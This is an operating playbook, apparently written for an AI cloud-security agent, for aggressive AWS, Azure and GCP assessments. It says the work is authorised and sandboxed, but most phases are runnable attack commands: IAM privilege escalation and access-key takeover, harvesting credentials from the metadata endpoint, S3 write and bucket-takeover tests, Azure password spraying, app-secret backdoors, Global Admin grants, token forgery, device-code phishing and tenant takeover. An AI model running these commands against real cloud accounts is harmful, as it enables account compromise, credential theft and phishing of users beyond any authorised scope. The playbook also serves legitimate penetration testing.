# Skill Playbook: cloud-expert-agent — DEEP AGGRESSIVE MODE

> **Purpose:** Authoritative deep-aggressive-mode operating procedures for AWS/Azure/GCP cloud security assessment. Every phase embeds skill-library technique chains from `skills/aws-iam/*`, `skills/azure-ad/*`, and `skills/cloud-security/*`. Attack simulation is sandbox-only; live assessment uses read-only credentials.

## Phase 1 — Cloud Asset Discovery

1. **Provider Authentication** — Configure read-only credentials. Verify identity: `aws sts get-caller-identity`; `az login --allow-no-subscriptions && az rest --method GET --uri "https://graph.microsoft.com/v1.0/me"`.
2. **Account Enumeration** — `prowler aws --services iam s3 kms cloudtrail ec2 lambda -M csv -o ./prowler-out` for asset discovery; `scout aws --report-dir ./reports --services iam s3 kms` for complementary coverage.
3. **Tenant Recon (Azure, unauthenticated)** — `curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq -r '.issuer'`; `Invoke-AADIntReconAsOutsider -DomainName "<domain>"`; `GetCredentialType` user-existence checks against a controlled user list.
4. **Organization Mapping** — Enumerate AWS Organizations OUs/accounts, Azure management groups, GCP projects/folders for control-plane gaps.
5. **Artifact Collection** — Gather Terraform/CloudFormation/Pulumi state, kubeconfigs (read-only context), container registry URLs, and image digests.

## Phase 2 — CSPM Benchmarking

1. **CIS Benchmark** — `prowler aws --compliance cis_aws_foundational -M csv -o ./prowler-cis` and equivalent Azure/GCP profiles.
2. **Custom Queries** — Steampipe: `select * from aws_s3_bucket where bucket_acl = 'public-read'`; `select * from aws_iam_role where assume_role_policy_document ::jsonb @> '{"Principal":{"AWS":"*"}}'`.
3. **Logging Gaps** — `aws cloudtrail list-trails --query 'TrailList[*].[Name,IsLogging]' --output table`; `aws cloudtrail get-event-selectors --trail-name <trail>`; Azure AuditLogs/SigninLogs coverage checks.
4. **Network Posture** — VPC peering across org boundaries, VPN third-party connections, Route53/Azure DNS exfiltration vectors, SCP/management-group policy inheritance gaps.

## Phase 3 — AWS IAM Privilege Escalation Chains (skills/aws-iam/aws-privesc.md)

1. **Baseline Enumeration** — `aws iam list-users/list-roles/list-policies --scope All --only-attached`; `aws iam get-account-authorization-details > authz.json`; `cloudsplaining scan --input-file authz.json --output out`; `pmapper graph create --account <acct> && pmapper query 'preset privesc *'`.
2. **Simulate** — `aws iam simulate-principal-policy --policy-source-arn <arn> --action-names iam:* ec2:* lambda:* s3:* sts:AssumeRole --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' --output table | grep -i allow`.
3. **iam:CreateAccessKey** — `aws iam create-access-key --user-name victim --output json`; export the new keys; `aws sts get-caller-identity` confirms identity takeover.
4. **Attach/Inline Admin Policy** — `aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`; `aws iam put-user-policy --user-name <user> --policy-name Admin --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'`.
5. **iam:CreatePolicyVersion + SetDefaultPolicyVersion** — `aws iam create-policy-version --policy-arn <arn> --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default`.
6. **iam:UpdateAssumeRolePolicy** — Set the target role's trust to the attacker ARN, then `aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<target-role> --role-session-name esc`.
7. **iam:PassRole + lambda:CreateFunction** — Zip a boto3 sts caller payload, `aws lambda create-function --function-name esc-<id> --runtime python3.12 --role <priv-role-arn> --handler payload.handler --zip-file fileb://payload.zip`, `aws lambda invoke --function-name esc-<id> --payload '{}' out.json`. The invoke output returns the privileged role's identity.
8. **iam:PassRole + EC2 RunInstances / ECS RunTask / CloudFormation** — Run a privileged role via `--iam-instance-profile` + user-data exfil, or `aws ecs register-task-definition --task-role-arn <priv-role>` + `run-task`, or CloudFormation `create-stack --role-arn <priv-role>` with an IAM user template.
9. **sts:AssumeRole (wildcard trust)** — Loop roles and attempt assume; `s3:PutObject` on a role's bootstrap bucket to poison an s3-backed bootstrap (per `skills/aws-iam/aws-privesc.md` 3.9).
10. **Cross-account/Confused Deputy** — Sweep role trust documents for `Principal: {"AWS":"*"}` or `"root"` patterns.
11. **Metadata Endpoint** — `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`; IMDSv2 token flow: `TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`. Harvested keys route encrypted to vault-agent.
12. **Pacu** — `set_keys; run iam__enum_users_roles_policies_groups; run iam__privesc_scan; run iam__backdoor_users_keys` (sandbox only).

## Phase 4 — S3 Bucket Abuse (skills/aws-iam/aws-s3-security.md)

1. **Bucket Enumeration** — `aws s3api list-buckets`; per-bucket `get-bucket-location`, `get-public-access-block`, `get-bucket-policy`, `get-bucket-acl`, `get-bucket-versioning`, `get-bucket-encryption`.
2. **Unauthenticated Confirmation** — `curl -s -o /dev/null -w "%{http_code}\n" "https://<bucket>.s3.amazonaws.com/"` (200 = public); `aws s3 ls s3://<bucket>/ --no-sign-request`; `aws s3 cp s3://<bucket>/file.txt . --no-sign-request`.
3. **Write Test** — `echo "pwned" > /tmp/t.txt; aws s3 cp /tmp/t.txt s3://<bucket>/proof.txt --no-sign-request` (write enabled = data tampering/staging risk; clean up the object afterward).
4. **Wildcard Principal Analysis** — Parse bucket policy for `"Principal":"*"` without conditions; check ACL grants to `AllUsers`/`AuthenticatedUsers`.
5. **Deleted Bucket Takeover** — Confirm `NoSuchBucket` response, then `aws s3api create-bucket --bucket <deleted-bucket> --region us-east-1` in a sandbox account and serve content to prove takeover.
6. **SSRF-to-S3** — If an app fetches arbitrary URLs, pull the metadata service and use the harvested role to `aws s3 sync s3://target-bucket/data ./ --recursive`.
7. **Exfil Search** — `aws s3 ls s3://<bucket>/ --no-sign-request --recursive | grep -iE "\.env|backup|credential|secret|\.sql|\.json"`.
8. **Pacu** — `run s3__enum; run s3__download_bucket` (sandbox).

## Phase 5 — Azure AD / Entra ID Attacks (skills/azure-ad/skill-playbook.md)

1. **Unauthenticated Recon** — Tenant ID via openid-configuration; `GetCredentialType` user-existence sweep: `for u in $(cat users.txt); do r=$(curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" -H "Content-Type: application/json" -d "{\"Username\":\"$u\",\"IsOtherIdpSupported\":true}"); [ "$(echo $r | jq -r '.IfExistsResult')" = "0" ] && echo "EXISTS: $u"; done`.
2. **AADInternals Outsider Recon** — `Invoke-AADIntReconAsOutsider -DomainName "<domain>" | Format-List`; `Get-AADIntTenantID -Domain "<domain>"`.
3. **Authenticated Graph Enumeration** — `az rest --method GET --uri "https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,displayName,accountEnabled&$top=999"`; role assignments `.../roleManagement/directory/roleAssignments?$expand=principal`; applications and service principals with `passwordCredentials`/`keyCredentials`.
4. **Full Directory Dump** — `roadrecon auth -u user@<domain> -p 'Password'` or `--device-code`; `roadrecon gather`; `roadrecon gui`.
5. **Password Spraying (authorized, lockout-safe)** — AADInternals `Invoke-AADIntTokenAcquisition` loop over the user list with `Start-Sleep 30` between attempts; never exceed safe thresholds.
6. **Token Pivots (FOCI)** — `roadtx gettokens -u user@<domain> -p 'Password' -c azcli -r msgraph`; `roadtx refreshtokento -r azrm --foci` to pivot a Graph refresh token to ARM; `roadtx describe -t <JWT>` to verify `aud`/`scp`.
7. **Managed Identity / App Secret Theft** — `az ad app credential reset --id <app-id> --append --years 2` (backdoor an elevated app); then `az login --service-principal -u <app-id> -p '<new-secret>' --tenant <tenant-id> --allow-no-subscriptions`.
8. **Role Assignment Escalation** — Create a controlled account and grant Global Admin: `az rest --method POST --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" --body '{"principalId":"<id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/"}'`.
9. **PRT Attacks** — `roadtx prt -u user@<domain> -p 'Password' --key-pem k.pem --cert-pem c.pem`; `roadtx prtauth -c msteams -r msgraph`; `roadtx getscope -s "https://graph.microsoft.com/RoleManagement.ReadWrite.Directory https://graph.microsoft.com/User.ReadWrite.All" --foci`.
10. **Golden SAML / Silver Tokens** — With the token-signing cert: `New-AADIntSAMLToken -ImmutableID <id>`; `New-AADIntKerberosTicket -SID <sid> -KDC <kdc> -Key <aes256>`.
11. **Device Code Phishing** — Initiate `urn:ietf:params:oauth:grant-type:device_code` with a first-party client_id (e.g., Teams `1fec8e78-bce4-4aaf-ab1b-5451cc387264`), phish the user_code, poll the token endpoint.
12. **Conditional Access Bypass** — Enumerate `.../identity/conditionalAccess/policies`; test legacy-auth flows (IMAP/POP/SMTP), report-only policies, device-code flow, first-party client IDs.
13. **Tenant Takeover** — If a verified domain is expired/renewable, re-register it, add DNS TXT, verify via Graph, and establish control per `skills/azure-ad/skill-playbook.md` 3.7.

## Phase 6 — Container, Kubernetes & IaC Security

1. **Trivy** — `trivy image <registry/image@digest>`; `trivy config <iac-dir>`; `trivy sbom --format cyclonedx --output sbom.json alpine:latest`.
2. **Grype** — `grype <registry/image@digest>` for complementary coverage.
3. **kube-hunter** — `kube-hunter --remote <cluster-endpoint>` (passive); active mode sandbox only.
4. **kube-bench** — `kube-bench --config <cfg>` for CIS Kubernetes benchmark.
5. **Checkov/tfsec** — `checkov -d <terraform-dir>`; `tfsec <terraform-dir>`; `trivy config <iac-dir>`; review findings against deployed reality before reporting.
6. **Lambda Function Analysis** — Enumerate `aws lambda list-functions` and their execution roles; look for over-privileged execution roles and broad `lambda:InvokeFunction` resource policies.

## Phase 7 — Evasion & Deep Aggressive Execution

1. **Provider Rate Limits** — Respect per-API throttles; exponential backoff on 429s; batch enumeration where the provider allows.
2. **Stealth** — Use read-only, low-signal API calls first; defer aggressive enumeration (full directory dumps, sprays) until RoE confirms authorization.
3. **Chain Persistence** — Prove every chain with a second tool (Pacu + Cloudsplaining, AADInternals + ROADtools) before promoting a finding.
4. **Coverage Gate** — Before closing a cloud environment: baseline CSPM run, IAM privesc scan, S3 exposure sweep, Azure identity recon (tenant + users + roles), managed identity/metadata check, container/IaC scan, logging-gap assessment, and networking exfiltration review.

## Phase 8 — Verification & Evidence

1. **Sandbox Isolation** — Escalation chains executed only in isolated sandbox accounts/tenants; production resources never modified.
2. **simulate-principal-policy** — Every claimed permission confirmed by the policy simulator.
3. **Independent Tools** — Cross-validate Prowler/Pacu/Cloudsplaining and AADInternals/ROADtools outputs.
4. **Token Claim Inspection** — `roadtx describe` on every pivot token before use.
5. **CloudTrail / AuditLogs** — Review attribution of the exact API call sequence used.
6. **Cleanup** — Delete created functions/stacks/tasks/users/keys/buckets; restore original policy state; verify remediation commands in sandbox first.
7. **Handoff** — Findings YAML with full chain (primitive -> action -> impact), CIS benchmark IDs, compliance mappings, and remediation commands; exposed credentials to vault-agent (encrypted) and secrets-scanning-agent.
